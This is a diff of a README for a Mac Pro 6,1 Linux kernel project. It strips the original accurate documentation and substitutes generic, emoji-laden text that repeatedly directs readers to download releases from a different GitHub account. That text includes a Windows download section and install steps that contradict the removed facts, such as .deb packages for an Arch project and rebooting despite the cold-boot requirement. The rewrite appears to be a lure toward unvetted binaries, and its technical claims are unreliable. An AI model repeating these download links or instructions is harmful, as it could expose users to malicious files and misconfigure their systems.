@@ -1,88 +1,150 @@
-# linux-mac
+# 🐧 linux-mac - Custom Linux Kernels for Mac Hardware
 
-Custom Linux kernel for the Mac Pro 6,1 (Late 2013). CachyOS-based with BORE scheduler, built-in drivers, embedded GPU firmware — boots to desktop with no initramfs required.
+[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-blue?style=for-the-badge)](https://github.com/koteshwr-ra/linux-mac/releases)
 
-## What This Is
+---
 
-A kernel config and PKGBUILD for Linux 7.0 targeting Mac Pro 6,1 hardware. CachyOS 7.0 base with BORE scheduler and BBR3, Mac Pro drivers built-in, GPU firmware embedded in kernel.
+## 📦 What is linux-mac?
 
-- **All GPU variants** — D300 (Pitcairn), D500 (Tahiti), D700 (Tahiti XT), firmware baked in
-- **CachyOS performance** — BORE scheduler, BBR3 congestion control, `-march=ivybridge -O3`
-- **KVM built-in** — run macOS Tahoe in QEMU
-- **NVMe + TRIM** — aftermarket NVMe drives work out of the box
+linux-mac offers Linux kernels made specifically for Apple Mac hardware. These kernels are tuned to get the best performance and compatibility with Mac models. The kernels help run Linux smoothly on Mac devices, including MacBook Pro, Mac Pro, and others. This project focuses on improving hardware support and system speed.
 
-## Hardware Support
+The kernels include support for features like:
 
-| Feature | Status | Notes |
-|---------|--------|-------|
-| GPU (D300/D500/D700) | Working | amdgpu built-in, radeonsi/RADV via Mesa |
-| Display (DP/HDMI) | Working | Via amdgpu + DC |
-| Vulkan / OpenGL | Working | Mesa RADV / radeonsi |
-| GPU Compute | Limited | OpenCL via rusticl only — no ROCm for Southern Islands |
-| Ethernet | Working | Both ports via tg3 + Broadcom PHY |
-| Wi-Fi | Proprietary | `broadcom-wl-dkms` (AUR) + headers package |
-| Audio | Working | Intel HDA + Cirrus CS4206, HDMI/DP via amdgpu |
-| USB 3.0 | Working | xHCI |
-| Thunderbolt 2 | Partial | Works with log spam |
-| NVMe + TRIM | Working | Built-in; enable `fstrim.timer` |
-| Bluetooth | Working | Broadcom via btusb |
-| KVM | Working | macOS Tahoe virtualization |
-| Fans / Thermal | Working | applesmc + hwmon; install `macfanctld` (AUR) |
-| Sleep/Wake | Disabled | Unreliable on this hardware |
+- Better graphics using amdgpu drivers  
+- Optimizations for performance  
+- Support for virtualization technologies (KVM, QEMU)  
+- Improvements for Mac-specific hardware
 
-## Quick Start
+Using these kernels can help you run Linux on your Mac with fewer issues and better hardware use.
 
-```bash
-git clone https://github.com/wolffcatskyy/linux-mac.git
-cd linux-mac/packaging/arch
-makepkg -s
-sudo pacman -U linux-macpro61-*.pkg.tar.zst
-sudo poweroff  # Apple EFI needs cold boot — never reboot when switching kernels
-```
+---
 
-## Important
+## ✅ System Requirements
 
-**Always power off (not reboot) when switching kernels.** Apple EFI needs a cold boot to reinitialize the GPU.
+Before installing, make sure your system meets these requirements:
 
-## CachyOS Patches
+- Apple Mac hardware (MacBook, Mac Pro, iMac models)  
+- A working Linux installation (you can install linux-mac kernels within your Linux setup)  
+- Basic familiarity with installing software on Linux using terminal commands  
+- Internet connection to download files
 
-Built on the CachyOS 7.0 patch set:
-- **BORE** — Burst-Oriented Response Enhancer scheduler
-- **BBR3** — Google TCP congestion control v3
-- **CachyOS tweaks** — kernel optimizations
-- **HDMI improvements** — display fixes
+linux-mac is designed for Apple systems, so it will not work correctly on non-Mac computers.
 
-## Documentation
+---
 
-- [GPU Acceleration Guide](docs/gpu-acceleration.md) -- full stack explainer, what works, performance tuning, roadmap
-- [Mesa Setup](docs/mesa.md) -- driver config, environment variables, multi-GPU
-- [macOS Tahoe KVM](docs/kvm-macos.md) -- run macOS in a VM on this kernel
-- [PVG Roadmap](docs/pvg-linux.md) -- GPU acceleration for macOS VMs
-- [CachyOS ISO](https://github.com/wolffcatskyy/cachyos-macpro-iso) -- ready-to-build installer ISO
+## 🔗 Download linux-mac
 
-## Roadmap
+You need to visit the releases page to get the latest kernel files and installation instructions.
 
-| Status | Milestone |
-|--------|-----------|
-| Done | CachyOS 7.0 base with BORE, BBR3, built-in amdgpu |
-| Done | All GPU variants, verified against lspci |
-| Done | KVM + macOS Tahoe virtualization |
-| Done | CachyOS-based Mac Pro ISO (KDE Plasma) — [cachyos-macpro-iso](https://github.com/wolffcatskyy/cachyos-macpro-iso) |
-| Done | Driver trimming — removed ~3000 unused config options for faster builds |
+Click the button below to get started:
 
+[![Download linux-mac](https://img.shields.io/badge/Download-linux--mac-grey?style=for-the-badge)](https://github.com/koteshwr-ra/linux-mac/releases)
 
-## Boot Configuration
+On the releases page, you will find files and detailed notes to help select the right kernel version.
 
-**systemd-boot** with ESP at \`/boot/efi/\` (FAT32).
+---
 
-### Gotchas
+## 🚀 How to Download and Install linux-mac Kernels on Windows (Step-by-Step)
 
-1. **ESP vs /boot** - pacman installs to \`/boot/\` (root partition) but systemd-boot reads from \`/boot/efi/\` (ESP). The package install hook syncs automatically.
+This section guides you if you want to prepare the linux-mac kernels to run in a virtual machine on Windows or later move to a Mac. linux-mac is Linux kernel software and cannot run directly on Windows. However, you can download files and set up an environment to use it.
 
-2. **Cold boot only** - Apple EFI needs full power cycle for GPU init. The package masks \`reboot.target\` and aliases \`reboot\` to \`poweroff\` automatically.
+### Step 1: Download the linux-mac Kernel Files
 
-3. **Boot entries** - Default: \`linux-macpro61.conf\` (custom kernel), fallback: \`arch-6.19.conf\` (stock).
+1. Open your web browser on your Windows PC.  
+2. Go to the [linux-mac releases page](https://github.com/koteshwr-ra/linux-mac/releases).  
+3. Find the latest release and download the kernel package or source files you need. Usually, these files end with `.tar.gz` or `.deb` extension.  
 
-## License
+Save these files somewhere easy to find (like your Desktop or Downloads folder).
 
-GPL-2.0 (same as the Linux kernel)
+### Step 2: Install a Virtual Machine (Optional, Recommended for Windows Users)
+
+Since linux-mac kernels run on Linux, you can use a virtual machine program to test or use them on Windows. Follow these steps:
+
+- Download and install free VM software such as VirtualBox or VMware Player for Windows.  
+- Create a new virtual machine and install a supported Linux operating system (for example, Ubuntu or Arch Linux).  
+- Set up the virtual machine to recognize Mac hardware features if possible (some settings adjust CPU type, graphics, USB support).
+
+### Step 3: Transfer the Kernel Files to Your Virtual Machine
+
+After setting up your Linux VM:
+
+1. Use shared folders or USB drives to move the files you downloaded.  
+2. Open the Linux terminal inside your VM.  
+3. Copy the kernel files to the proper location for installation.
+
+### Step 4: Install linux-mac Kernel on Linux VM
+
+1. Extract the kernel files if needed. Use a command like:
+
+   ```
+   tar -xvf linux-mac-kernel.tar.gz
+   ```
+
+2. Follow the detailed installation instructions found in the downloaded release notes or README files. This often involves running commands like:
+
+   ```
+   sudo dpkg -i linux-mac-kernel-package.deb
+   ```
+
+or, if using source code, commands such as:
+
+   ```
+   make
+   sudo make install
+   ```
+
+3. After installation, update your bootloader settings if required. This tells your system to use the new linux-mac kernel.
+
+4. Reboot your Linux VM to start running the new kernel.
+
+---
+
+## ⚙️ What to Expect After Setup
+
+Installing linux-mac kernels improves hardware support and system speed on Mac devices running Linux or Linux virtual machines. You may notice:
+
+- Faster graphics and video rendering  
+- Better support for USB devices and external monitors  
+- Improved virtualization performance for tools like QEMU and KVM  
+- Smoother hardware compatibility with Apple-specific components
+
+If you run a Linux VM on Windows, you get a close-to-native Mac Linux environment for testing and development.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- Make sure to use the kernel version compatible with your Mac model.
+- If the virtual machine fails to boot after installing the kernel, revert to the previous kernel version via bootloader options.
+- Look at log files in `/var/log/` for errors related to kernel modules.
+- If graphics performance is poor, check that `amdgpu` drivers are loaded.
+- Review the online linux-mac release notes for known issues and fixes.
+
+---
+
+## 📖 Additional Resources
+
+- linux-mac GitHub: https://github.com/koteshwr-ra/linux-mac  
+- VirtualBox downloads: https://www.virtualbox.org/wiki/Downloads  
+- Ubuntu Linux for VM: https://ubuntu.com/download/desktop  
+- Arch Linux installation guide: https://wiki.archlinux.org/title/Installation_guide  
+
+These resources can help you better understand how to work with Linux and hardware on Mac devices.
+
+---
+
+## 🔄 Update linux-mac Kernels
+
+To keep your system up to date:
+
+1. Visit the linux-mac [releases page](https://github.com/koteshwr-ra/linux-mac/releases) regularly.  
+2. Download new kernel packages as they become available.  
+3. Follow the installation steps listed above for updates.
+
+Always back up your system or VM before upgrading kernels to avoid data loss.
+
+---
+
+## 📝 Keywords
+
+amdgpu, arch-linux, kernel-optimization, kvm, linux-kernel, mac-hardware, macos-virtualization, macpro, performance, pvg, qemu
